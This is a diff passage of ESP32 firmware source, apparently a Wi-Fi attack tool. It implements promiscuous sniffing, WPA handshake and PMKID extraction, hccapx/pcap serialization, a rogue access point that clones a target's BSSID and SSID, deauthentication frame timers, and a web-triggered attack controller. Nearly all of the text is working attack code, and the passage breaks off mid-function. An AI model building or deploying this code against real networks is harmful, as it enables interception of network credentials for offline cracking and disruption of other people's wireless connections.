+static void sta_message_m4(eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  ESP_LOGD(TAG_HCCAPX, "From STA M4");
+  if ((message_sta == 2) && (eapol_source != 0))
+  {
+    // If message 2 was already fully processed, there is no need to process M4 again
+    ESP_LOGD(TAG_HCCAPX, "Already have M2, not worth");
+    return;
+  }
+  if (message_ap == 0)
+  {
+    // If there was no AP message processed yet, ANonce will be always missing.
+    ESP_LOGE(TAG_HCCAPX, "Not enought handshake messages received.");
+    return;
+  }
+  if (eapol_source == 3)
+  {
+    hccapx.message_pair = 4;
+    return;
+  }
+  if (save_eapol(eapol_packet, eapol_key_packet) != 0)
+  {
+    return;
+  }
+  eapol_source = 4;
+  if (message_ap == 1)
+  {
+    hccapx.message_pair = 1;
+  }
+  if (message_ap == 3)
+  {
+    hccapx.message_pair = 5;
+  }
+}
+
+/**
+ * @brief Handles messages from STA - M2 and M4
+ *
+ * @param frame
+ * @param eapol_packet
+ * @param eapol_key_packet
+ */
+static void sta_message(data_frame_t *frame, eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  if (is_array_zero(hccapx.mac_sta, 6))
+  {
+    memcpy(hccapx.mac_sta, frame->mac_header.addr2, 6);
+  }
+  else if (memcmp(frame->mac_header.addr2, hccapx.mac_sta, 6) != 0)
+  {
+    ESP_LOGE(TAG_HCCAPX, "Different STA");
+    return;
+  }
+  // Determine which message this is by SNonce
+  // SNonce is present in M2, empty in M4
+  // Ref: 802.11i-2004 [8.5.3]
+  if (!is_array_zero(eapol_key_packet->key_nonce, 16))
+  {
+    sta_message_m2(eapol_packet, eapol_key_packet);
+  }
+  else
+  {
+    sta_message_m4(eapol_packet, eapol_key_packet);
+  }
+}
+
+/**
+ * @detail This component is a state machine, so this function can be used without knowing current state from outside.
+ * WPA handshake pseudo-diagram:
+ * @code{.unparsed}
+ * AP           STA
+ * M1 ---------> |
+ * | <--------- M2
+ * M3 ---------> |
+ * | <--------- M4
+ * @endcode
+ *
+ * @param frame
+ */
+void hccapx_serializer_add_frame(data_frame_t *frame)
+{
+  eapol_packet_t *eapol_packet = parse_eapol_packet(frame);
+  if (!eapol_packet)
+    return;
+  eapol_key_packet_t *eapol_key_packet = parse_eapol_key_packet(eapol_packet);
+  if (!eapol_key_packet)
+    return;
+
+  // Determine direction of the frame by comparing BSSID (addr3) with source address (addr2)
+  if (memcmp(frame->mac_header.addr2, frame->mac_header.addr3, 6) == 0)
+  {
+    ap_message(frame, eapol_packet, eapol_key_packet);
+  }
+  else if (memcmp(frame->mac_header.addr1, frame->mac_header.addr3, 6) == 0)
+  {
+    sta_message(frame, eapol_packet, eapol_key_packet);
+  }
+  else
+  {
+    ESP_LOGE(TAG_HCCAPX, "Unknown frame format. BSSID is not source nor destionation.");
+  }
+}
+
+/* ==================== frame_analyzer_parser.c content ==================== */
+static const char *TAG_PARSER = "frame_analyzer:parser";
+
+/**
+ * @brief Debug function to print raw frame to serial
+ *
+ * @param frame
+ */
+void print_raw_frame(const wifi_promiscuous_pkt_t *frame)
+{
+  for (unsigned i = 0; i < frame->rx_ctrl.sig_len; i++)
+  {
+    printf("%02x", frame->payload[i]);
+  }
+  printf("\n");
+}
+
+/**
+ * @brief Debug functions to print MAC address from given buffer to serial
+ *
+ * @param a mac address buffer
+ */
+void print_mac_address(const uint8_t *a)
+{
+  printf("%02x:%02x:%02x:%02x:%02x:%02x",
+         a[0], a[1], a[2], a[3], a[4], a[5]);
+  printf("\n");
+}
+
+bool is_frame_bssid_matching(wifi_promiscuous_pkt_t *frame, uint8_t *bssid)
+{
+  data_frame_mac_header_t *mac_header = (data_frame_mac_header_t *)frame->payload;
+  return memcmp(mac_header->addr3, bssid, 6) == 0;
+}
+
+eapol_packet_t *parse_eapol_packet(data_frame_t *frame)
+{
+  uint8_t *frame_buffer = frame->body;
+
+  if (frame->mac_header.frame_control.protected_frame == 1)
+  {
+    ESP_LOGV(TAG_PARSER, "Protected frame, skipping...");
+    return NULL;
+  }
+
+  if (frame->mac_header.frame_control.subtype > 7)
+  {
+    ESP_LOGV(TAG_PARSER, "QoS data frame");
+    // Skipping QoS field (2 bytes)
+    frame_buffer += 2;
+  }
+
+  // Skipping LLC SNAP header (6 bytes)
+  frame_buffer += sizeof(llc_snap_header_t);
+
+  // Check if frame is type of EAPoL
+  if (ntohs(*(uint16_t *)frame_buffer) == ETHER_TYPE_EAPOL)
+  {
+    ESP_LOGD(TAG_PARSER, "EAPOL packet");
+    frame_buffer += 2;
+    return (eapol_packet_t *)frame_buffer;
+  }
+  return NULL;
+}
+
+eapol_key_packet_t *parse_eapol_key_packet(eapol_packet_t *eapol_packet)
+{
+  if (eapol_packet->header.packet_type != EAPOL_KEY)
+  {
+    ESP_LOGD(TAG_PARSER, "Not an EAPoL-Key packet.");
+    return NULL;
+  }
+  return (eapol_key_packet_t *)eapol_packet->packet_body;
+}
+
+/**
+ * @brief Parses all PMKIDs to linked list structure
+ *
+ * It crawlers through key data buffer and looks for PMKIDs.
+ * If PMKID element is found, its saved into the list of PMKIDs.
+ * @param key_data
+ * @param length of key data
+ * @return pmkid_item_t*
+ */
+static pmkid_item_t *parse_pmkid_from_key_data(uint8_t *key_data, const uint16_t length)
+{
+  uint8_t *key_data_index = key_data;
+  uint8_t *key_data_max_index = key_data + length;
+
+  pmkid_item_t *pmkid_item_head = NULL;
+  key_data_field_t *key_data_field;
+  do
+  {
+    key_data_field = (key_data_field_t *)key_data_index;
+
+    ESP_LOGV(TAG_PARSER, "EAPOL-Key -> Key-Data -> type=%x; length=%x; oui=%x; data_type=%x",
+             key_data_field->type,
+             key_data_field->length,
+             key_data_field->oui,
+             key_data_field->data_type);
+
+    if (key_data_field->type != KEY_DATA_TYPE)
+    {
+      ESP_LOGD(TAG_PARSER, "Wrong type %x (expected %x)", key_data_field->type, KEY_DATA_TYPE);
+      key_data_index = key_data_field->data + key_data_field->length - 4 + 1;
+      continue;
+    }
+
+    if (ntohl(key_data_field->oui) != KEY_DATA_OUI_IEEE80211)
+    {
+      ESP_LOGD(TAG_PARSER, "Wrong OUI %x (expected %x)", key_data_field->oui, KEY_DATA_OUI_IEEE80211);
+      key_data_index = key_data_field->data + key_data_field->length - 4 + 1;
+      continue;
+    }
+
+    if (key_data_field->data_type != KEY_DATA_DATA_TYPE_PMKID_KDE)
+    {
+      ESP_LOGD(TAG_PARSER, "Wrong data type %x (expected %x)", key_data_field->data_type, KEY_DATA_DATA_TYPE_PMKID_KDE);
+      key_data_index = key_data_field->data + key_data_field->length - 4 + 1;
+      continue;
+    }
+
+    ESP_LOGI(TAG_PARSER, "Found PMKID: ");
+    pmkid_item_t *pmkid_item = (pmkid_item_t *)malloc(sizeof(pmkid_item_t));
+    pmkid_item->next = pmkid_item_head;
+    pmkid_item_head = pmkid_item;
+    for (unsigned i = 0; i < 16; i++)
+    {
+      pmkid_item->pmkid[i] = key_data_field->data[i];
+      printf("%02x", pmkid_item->pmkid[i]);
+    }
+    printf("\n");
+
+    key_data_index = key_data_field->data + key_data_field->length - 4 + 1;
+
+  } while (key_data_index < key_data_max_index);
+
+  return pmkid_item_head;
+}
+
+pmkid_item_t *parse_pmkid(eapol_key_packet_t *eapol_key)
+{
+  if (eapol_key->key_data_length == 0)
+  {
+    ESP_LOGD(TAG_PARSER, "Empty Key Data");
+    return NULL;
+  }
+
+  if (eapol_key->key_information.encrypted_key_data == 1)
+  {
+    ESP_LOGD(TAG_PARSER, "Key Data encrypted");
+    return NULL;
+  }
+
+  return parse_pmkid_from_key_data(eapol_key->key_data, ntohs(eapol_key->key_data_length));
+}
+
+/* ==================== sniffer.c content ==================== */
+static const char *TAG_SNIFFER = "sniffer";
+
+/**
+ * @brief Callback for promiscuous reciever.
+ *
+ * It forwards captured frames into event pool and sorts them based on their type
+ * - Data
+ * - Management
+ * - Control
+ *
+ * @param buf
+ * @param type
+ */
+static void frame_handler(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+  ESP_LOGV(TAG_SNIFFER, "Captured frame %d.", (int)type);
+
+  wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)buf;
+
+  int32_t event_id;
+  switch (type)
+  {
+  case WIFI_PKT_DATA:
+    event_id = SNIFFER_EVENT_CAPTURED_DATA;
+    break;
+  case WIFI_PKT_MGMT:
+    event_id = SNIFFER_EVENT_CAPTURED_MGMT;
+    break;
+  case WIFI_PKT_CTRL:
+    event_id = SNIFFER_EVENT_CAPTURED_CTRL;
+    break;
+  default:
+    return;
+  }
+
+  ESP_ERROR_CHECK(esp_event_post(SNIFFER_EVENTS, event_id, frame, frame->rx_ctrl.sig_len + sizeof(wifi_promiscuous_pkt_t), portMAX_DELAY));
+}
+
+/**
+ * @see https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html#_CPPv425wifi_promiscuous_filter_t
+ */
+void wifictl_sniffer_filter_frame_types(bool data, bool mgmt, bool ctrl)
+{
+  wifi_promiscuous_filter_t filter = {.filter_mask = 0};
+  if (data)
+  {
+    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
+  }
+  if (mgmt)
+  {
+    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_MGMT;
+  }
+  if (ctrl)
+  {
+    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_CTRL;
+  }
+  esp_wifi_set_promiscuous_filter(&filter);
+}
+
+void wifictl_sniffer_start(uint8_t channel)
+{
+  ESP_LOGI(TAG_SNIFFER, "Starting promiscuous mode...");
+  // ESP32 cannot switch port, if there is some STA connected to AP
+  ESP_LOGD(TAG_SNIFFER, "Kicking all connected STAs from AP");
+  ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&frame_handler);
+}
+
+void wifictl_sniffer_stop()
+{
+  ESP_LOGI(TAG_SNIFFER, "Stopping promiscuous mode...");
+  esp_wifi_set_promiscuous(false);
+}
+
+/* ==================== frame_analyzer.c content ==================== */
+static const char *TAG_ANALYZER = "frame_analyzer";
+static uint8_t target_bssid[6];
+static search_type_t search_type = (search_type_t)-1;
+
+/**
+ * @brief Analyzes data frames from sniffer.
+ *
+ * @param args
+ * @param event_base
+ * @param event_id
+ * @param event_data
+ */
+static void data_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+  ESP_LOGV(TAG_ANALYZER, "Handling DATA frame");
+  wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event_data;
+
+  if (!is_frame_bssid_matching(frame, target_bssid))
+  {
+    ESP_LOGV(TAG_ANALYZER, "Not matching BSSIDs.");
+    return;
+  }
+
+  eapol_packet_t *eapol_packet = parse_eapol_packet((data_frame_t *)frame->payload);
+  if (eapol_packet == NULL)
+  {
+    ESP_LOGV(TAG_ANALYZER, "Not an EAPOL packet.");
+    return;
+  }
+
+  eapol_key_packet_t *eapol_key_packet = parse_eapol_key_packet(eapol_packet);
+  if (eapol_key_packet == NULL)
+  {
+    ESP_LOGV(TAG_ANALYZER, "Not an EAPOL-Key packet");
+    return;
+  }
+
+  if (search_type == SEARCH_HANDSHAKE)
+  {
+    // TODO handle timeouts properly by e.g. for cycle
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_post(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, frame, sizeof(wifi_promiscuous_pkt_t) + frame->rx_ctrl.sig_len, portMAX_DELAY));
+    return;
+  }
+
+  if (search_type == SEARCH_PMKID)
+  {
+    pmkid_item_t *pmkid_items;
+    if ((pmkid_items = parse_pmkid(eapol_key_packet)) == NULL)
+    {
+      return;
+    }
+    ESP_ERROR_CHECK(esp_event_post(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_items, sizeof(pmkid_item_t *), portMAX_DELAY));
+    return;
+  }
+}
+
+void frame_analyzer_capture_start(search_type_t search_type_arg, const uint8_t *bssid)
+{
+  ESP_LOGI(TAG_ANALYZER, "Frame analysis started...");
+  search_type = search_type_arg;
+  memcpy(target_bssid, bssid, 6);
+  ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &data_frame_handler, NULL));
+}
+
+void frame_analyzer_capture_stop()
+{
+  ESP_ERROR_CHECK(esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &data_frame_handler));
+}
+
+/* ==================== ap_scanner.c content ==================== */
+static const char *TAG_SCANNER = "wifi_controller/ap_scanner";
+/**
+ * @brief Stores last scanned AP records into linked list.
+ *
+ */
+static wifictl_ap_records_t ap_records;
+
+void wifictl_scan_nearby_aps()
+{
+  ESP_LOGD(TAG_SCANNER, "Scanning nearby APs...");
+
+  ap_records.count = CONFIG_SCAN_MAX_AP;
+
+  wifi_scan_config_t scan_config = {
+      .ssid = NULL,
+      .bssid = NULL,
+      .channel = 0,
+      .show_hidden = false,
+      .scan_type = WIFI_SCAN_TYPE_ACTIVE,
+      .scan_time = {.active = {.min = 0, .max = 0}}};
+
+  ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
+  ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_records.count, ap_records.records));
+  ESP_LOGI(TAG_SCANNER, "Found %u APs.", ap_records.count);
+  ESP_LOGD(TAG_SCANNER, "Scan done.");
+}
+
+const wifictl_ap_records_t *wifictl_get_ap_records()
+{
+  return &ap_records;
+}
+
+const wifi_ap_record_t *wifictl_get_ap_record(unsigned index)
+{
+  if (index >= ap_records.count)
+  {
+    ESP_LOGE(TAG_SCANNER, "Index out of bounds! %u records available, but %u requested", ap_records.count, index);
+    return NULL;
+  }
+  return &ap_records.records[index];
+}
+
+/* ==================== wifi_controller.c content ==================== */
+static const char *TAG_CTRL = "wifi_controller";
+/**
+ * @brief Stores current state of Wi-Fi interface
+ */
+static bool wifi_init = false;
+static uint8_t original_mac_ap[6];
+
+static void wifi_event_handler(void *event_handler_arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+}
+
+/**
+ * @brief Initializes Wi-Fi interface into APSTA mode and starts it.
+ *
+ * @attention This function should be called only once.
+ */
+static void wifi_init_apsta()
+{
+  ESP_ERROR_CHECK(esp_netif_init());
+
+  esp_netif_create_default_wifi_ap();
+  esp_netif_create_default_wifi_sta();
+
+  wifi_init_config_t wifi_init_config = WIFI_INIT_CONFIG_DEFAULT();
+
+  ESP_ERROR_CHECK(esp_wifi_init(&wifi_init_config));
+  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
+
+  ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL));
+
+  // save original AP MAC address
+  ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, original_mac_ap));
+
+  ESP_ERROR_CHECK(esp_wifi_start());
+  wifi_init = true;
+}
+
+void wifictl_ap_start(wifi_config_t *wifi_config)
+{
+  ESP_LOGD(TAG_CTRL, "Starting AP...");
+  if (!wifi_init)
+  {
+    wifi_init_apsta();
+  }
+
+  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, wifi_config));
+  ESP_LOGI(TAG_CTRL, "AP started with SSID=%s", wifi_config->ap.ssid);
+}
+
+void wifictl_ap_stop()
+{
+  ESP_LOGD(TAG_CTRL, "Stopping AP...");
+  wifi_config_t wifi_config = {};
+  wifi_config.ap.max_connection = 0;
+  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
+
+  // 🔥 Extra cleanup
+  esp_wifi_disconnect();
+  esp_wifi_stop();
+
+  ESP_LOGD(TAG_CTRL, "AP stopped");
+}
+void wifictl_mgmt_ap_start()
+{
+  wifi_config_t mgmt_wifi_config = {};
+
+  // Initialize exactly like original C code
+  strcpy((char *)mgmt_wifi_config.ap.ssid, CONFIG_MGMT_AP_SSID);
+  mgmt_wifi_config.ap.ssid_len = strlen(CONFIG_MGMT_AP_SSID);
+  strcpy((char *)mgmt_wifi_config.ap.password, CONFIG_MGMT_AP_PASSWORD);
+  mgmt_wifi_config.ap.max_connection = CONFIG_MGMT_AP_MAX_CONNECTIONS;
+  mgmt_wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+  mgmt_wifi_config.ap.channel = 1;
+
+  wifictl_ap_start(&mgmt_wifi_config);
+}
+
+void wifictl_sta_connect_to_ap(const wifi_ap_record_t *ap_record, const char password[])
+{
+  ESP_LOGD(TAG_CTRL, "Connecting STA to AP...");
+  if (!wifi_init)
+  {
+    wifi_init_apsta();
+  }
+
+  wifi_config_t sta_wifi_config = {};
+
+  memcpy(sta_wifi_config.sta.ssid, ap_record->ssid, 32);
+  sta_wifi_config.sta.channel = ap_record->primary;
+  sta_wifi_config.sta.scan_method = WIFI_FAST_SCAN;
+  sta_wifi_config.sta.pmf_cfg.capable = false;
+  sta_wifi_config.sta.pmf_cfg.required = false;
+
+  if (password != NULL)
+  {
+    if (strlen(password) >= 64)
+    {
+      ESP_LOGE(TAG_CTRL, "Password is too long. Max supported length is 64");
+      return;
+    }
+    memcpy(sta_wifi_config.sta.password, password, strlen(password) + 1);
+  }
+
+  ESP_LOGD(TAG_CTRL, ".ssid=%s", sta_wifi_config.sta.ssid);
+
+  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_wifi_config));
+  ESP_ERROR_CHECK(esp_wifi_connect());
+}
+
+void wifictl_sta_disconnect()
+{
+  ESP_ERROR_CHECK(esp_wifi_disconnect());
+}
+
+void wifictl_set_ap_mac(const uint8_t *mac_ap)
+{
+  ESP_LOGD(TAG_CTRL, "Changing AP MAC address...");
+  ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, mac_ap));
+}
+
+void wifictl_get_ap_mac(uint8_t *mac_ap)
+{
+  esp_wifi_get_mac(WIFI_IF_AP, mac_ap);
+}
+
+void wifictl_restore_ap_mac()
+{
+  ESP_LOGD(TAG_CTRL, "Restoring original AP MAC address...");
+  ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, original_mac_ap));
+}
+
+void wifictl_get_sta_mac(uint8_t *mac_sta)
+{
+  esp_wifi_get_mac(WIFI_IF_STA, mac_sta);
+}
+
+void wifictl_set_channel(uint8_t channel)
+{
+  if ((channel == 0) || (channel > 13))
+  {
+    ESP_LOGE(TAG_CTRL, "Channel out of range. Expected value from <1,13> but got %u", channel);
+    return;
+  }
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+
+/* ==================== attack_method.c content ==================== */
+static const char *TAG_METHOD = "main:attack_method";
+static esp_timer_handle_t deauth_timer_handle;
+
+/**
+ * @brief Callback for periodic deauthentication frame timer
+ *
+ * Periodicaly called to send deauthentication frame for given AP
+ *
+ * @param arg expects wifi_ap_record_t
+ */
+static void timer_send_deauth_frame(void *arg)
+{
+  wsl_bypasser_send_deauth_frame((const wifi_ap_record_t *)arg);
+}
+
+void attack_method_rogueap(const wifi_ap_record_t *ap_record)
+{
+  ESP_LOGD(TAG_METHOD, "Configuring Rogue AP");
+  wifictl_set_ap_mac(ap_record->bssid);
+
+  wifi_config_t ap_config = {};
+
+  memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
+  ap_config.ap.ssid_len = strlen((char *)ap_record->ssid);
+  strcpy((char *)ap_config.ap.password, "dummypassword");
+  ap_config.ap.channel = ap_record->primary;
+  ap_config.ap.authmode = ap_record->authmode;
+  ap_config.ap.max_connection = 1;
+
+  wifictl_ap_start(&ap_config);
+}
+
+/* ==================== attack_handshake.c content ==================== */
+static const char *TAG_HANDSHAKE = "main:attack_handshake";
+static attack_handshake_methods_t method = (attack_handshake_methods_t)-1;
+static const wifi_ap_record_t *ap_record = NULL;
+
+/**
+ * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
+ *
+ * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
+ * appends the frame to status content and serialize them into pcap and hccapx format.
+ *
+ * @param args not used
+ * @param event_base expects FRAME_ANALYZER_EVENTS
+ * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
+ * @param event_data expects wifi_promiscuous_pkt_t
+ */
+static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+  ESP_LOGI(TAG_HANDSHAKE, "Got EAPoL-Key frame");
+  ESP_LOGD(TAG_HANDSHAKE, "Processing handshake frame...");
+  wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event_data;
+  attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
+  pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
+  hccapx_serializer_add_frame((data_frame_t *)frame->payload);
+}
+
+void attack_handshake_start(attack_config_t *attack_config)
+{
+  ESP_LOGI(TAG_HANDSHAKE, "Starting handshake attack...");
+  method = (attack_handshake_methods_t)attack_config->method;
+  ap_record = attack_config->ap_record;
+  pcap_serializer_init();
+  hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
+  wifictl_sniffer_filter_frame_types(true, false, false);
+  wifictl_sniffer_start(ap_record->primary);
+  frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
+  ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
+  switch (attack_config->method)
+  {
+  case ATTACK_HANDSHAKE_METHOD_BROADCAST:
+    ESP_LOGI(TAG_HANDSHAKE, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
+    break;
+  case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
+    ESP_LOGI(TAG_HANDSHAKE, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
+    attack_method_rogueap(ap_record);
+    break;
+  case ATTACK_HANDSHAKE_METHOD_PASSIVE:
+    ESP_LOGI(TAG_HANDSHAKE, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
+    break;
+  default:
+    ESP_LOGI(TAG_HANDSHAKE, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
+  }
+}
+
+void attack_handshake_stop()
+{
+  switch (method)
+  {
+  case ATTACK_HANDSHAKE_METHOD_BROADCAST:
+    break;
+  case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
+    wifictl_mgmt_ap_start();
+    wifictl_restore_ap_mac();
+    break;
+  case ATTACK_HANDSHAKE_METHOD_PASSIVE:
+    // No actions required.
+    break;
+  default:
+    ESP_LOGE(TAG_HANDSHAKE, "Unknown attack method! Attack may not be stopped properly.");
+  }
+  wifictl_sniffer_stop();
+  frame_analyzer_capture_stop();
+  ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler));
+  ap_record = NULL;
+  method = (attack_handshake_methods_t)-1;
+  ESP_LOGD(TAG_HANDSHAKE, "Handshake attack stopped");
+}
+
+/* ==================== attack.c content ==================== */
+static const char *TAG_ATTACK = "attack";
+static attack_status_t attack_status = {.state = READY, .type = (uint8_t)-1, .content_size = 0, .content = NULL};
+static esp_timer_handle_t attack_timeout_handle;
+
+const attack_status_t *attack_get_status()
+{
+  return &attack_status;
+}
+
+void attack_update_status(attack_state_t state)
+{
+  attack_status.state = state;
+  if (state == FINISHED)
+  {
+    ESP_LOGD(TAG_ATTACK, "Stopping attack timeout timer");
+    ESP_ERROR_CHECK(esp_timer_stop(attack_timeout_handle));
+  }
+}
+
+void attack_append_status_content(uint8_t *buffer, unsigned size)
+{
+  if (size == 0)
+  {
+    ESP_LOGE(TAG_ATTACK, "Size can't be 0 if you want to reallocate");
+    return;
+  }
+  // temporarily save new location in case of realloc failure to preserve current content
+  char *reallocated_content = (char *)realloc(attack_status.content, attack_status.content_size + size);
+  if (reallocated_content == NULL)
+  {
+    ESP_LOGE(TAG_ATTACK, "Error reallocating status content! Status content may not be complete.");
+    return;
+  }
+  // copy new data after current content
+  memcpy(&reallocated_content[attack_status.content_size], buffer, size);
+  attack_status.content = reallocated_content;
+  attack_status.content_size += size;
+}
+
+char *attack_alloc_result_content(unsigned size)
+{
+  attack_status.content_size = size;
+  attack_status.content = (char *)malloc(size);
+  return attack_status.content;
+}
+
+/**
+ * @brief Callback function for attack timeout timer.
+ *
+ * This function is called when attack times out.
+ * It updates attack status state to TIMEOUT.
+ * It calls appropriate abort functions based on current attack type.
+ * @param arg not used.
+ */
+static void attack_timeout(void *arg)
+{
+  ESP_LOGD(TAG_ATTACK, "Attack timed out");
+
+  attack_update_status(TIMEOUT);
+
+  switch (attack_status.type)
+  {
+  case ATTACK_TYPE_HANDSHAKE:
+    ESP_LOGI(TAG_ATTACK, "Abort HANDSHAKE attack...");
+    attack_handshake_stop();
+    break;
+  default:
+    ESP_LOGE(TAG_ATTACK, "Unknown attack type. Not aborting anything");
+  }
+}
+
+/**
+ * @brief Callback for WEBSERVER_EVENT_ATTACK_REQUEST event.
+ *
+ * This function handles WEBSERVER_EVENT_ATTACK_REQUEST event from event loop.
+ * It parses attack_request_t structure and set initial values to attack_status.
+ * It sets attack state to RUNNING.
+ * It starts attack timeout timer.
+ * It starts attack based on chosen type.
+ *
+ * @param args not used
+ * @param event_base expects WEBSERVER_EVENTS
+ * @param event_id expects WEBSERVER_EVENT_ATTACK_REQUEST
+ * @param event_data expects attack_request_t
+ */
+static void attack_request_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+  ESP_LOGI(TAG_ATTACK, "Starting attack...");
+  attack_request_t *attack_request = (attack_request_t *)event_data;
+  attack_config_t attack_config = {.type = attack_request->type, .method = attack_request->method, .timeout = attack_request->timeout};
+  attack_config.ap_record = wifictl_get_ap_record(attack_request->ap_record_id);
+
+  attack_status.state = RUNNING;
+  attack_status.type = attack_config.type;
+
+  if (attack_config.ap_record == NULL)
+  {
+    ESP_LOGE(TAG_ATTACK, "NPE: No attack_config.ap_record!");
+    return;
+  }
+  // set timeout
+  ESP_ERROR_CHECK(esp_timer_start_once(attack_timeout_handle, attack_config.timeout * 1000000));
+  // start attack based on it's type
+  switch (attack_config.type)
+  {
+  case ATTACK_TYPE_HANDSHAKE:
+    attack_handshake_start(&attack_config);
+    break;
+  default:
+    ESP_LOGE(TAG_ATTACK, "Unknown attack type!");
+  }
+}
+
+/**
+ * @brief Callback for WEBSERVER_EVENT_ATTACK_RESET event.
+ *
+ * This callback resets attack status by freeing previously allocated status content and putting attack to READY state.
+ *
+ * @param args not used
+ * @param event_base expects WEBSERVER_EVENTS
+ * @param event_id expects WEBSERVER_EVENT_ATTACK_RESET
+ * @param event_data not used
+ */
+static void attack_reset_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+  ESP_LOGD(TAG_ATTACK, "Resetting attack status...");
+  if (attack_status.content)
+  {
+    free(attack_status.content);
+    attack_status.content = NULL;
+  }
+  attack_status.content_size = 0;
+  attack_status.type = (uint8_t)-1;
+  attack_status.state = READY;
+}
+
+/**
+ * @brief Initialises common attack resources.
+ *
+ * Creates attack timeout timer.
+ * Registers event loop event handlers.
+ */
+void attack_init()
+{
+  const esp_timer_create_args_t attack_timeout_args = {
+      .callback = &attack_timeout,
+      .arg = NULL,
+      .dispatch_method = ESP_TIMER_TASK,
+      .name = "attack_timeout"};
+  ESP_ERROR_CHECK(esp_timer_create(&attack_timeout_args, &attack_timeout_handle));
+
+  // 🔴 YAHAN PE EVENT IDs KO INTEGER BANA DO:
+  ESP_ERROR_CHECK(esp_event_handler_register(WEBSERVER_EVENTS, 0, &attack_request_handler, NULL));
+  ESP_ERROR_CHECK(esp_event_handler_register(WEBSERVER_EVENTS, 1, &attack_reset_handler, NULL));
+}
+
+/* ==================== webserver.c content ==================== */
+static const char *TAG_WEBSERVER = "webserver";
+
+/**
+ * @brief Handlers for index/root \c / path endpoint
+ *
+ * This endpoint provides index page source
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_root_get_handler(httpd_req_t *req)
+{
+  httpd_resp_set_type(req, "text/html");
+  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
+  return httpd_resp_send(req, (const char *)page_index, page_index_len);
+}
+
+static httpd_uri_t uri_root_get = {
+    .uri = "/",
+    .method = HTTP_GET,
+    .handler = uri_root_get_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /switchPacketWifi endpoint
+ *
+ * This endpoint switches back to PacketWiFi mode
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_switch_packetwifi_get_handler(httpd_req_t *req)
+{
+  // 🔥 1. Pehle WiFi properly stop karo
+  ESP_LOGI(TAG_WEBSERVER, "Stopping WiFi for switch...");
+
+  // Stop promiscuous mode agar chal raha ho
+  wifictl_sniffer_stop();
+
+  // Stop any ongoing attacks
+  attack_handshake_stop();
+
+  // Stop AP
+  wifictl_ap_stop();
+
+  // Disconnect STA if connected
+  wifictl_sta_disconnect();
+
+  // Small delay for cleanup
+  vTaskDelay(pdMS_TO_TICKS(100));
+
+  // 2. NVS write
+  Preferences prefs;
+  prefs.begin("boot", false);
+  prefs.putInt("mode", 0); // 0 = PacketWiFi
+  prefs.end();
+
+  // 3. Send response
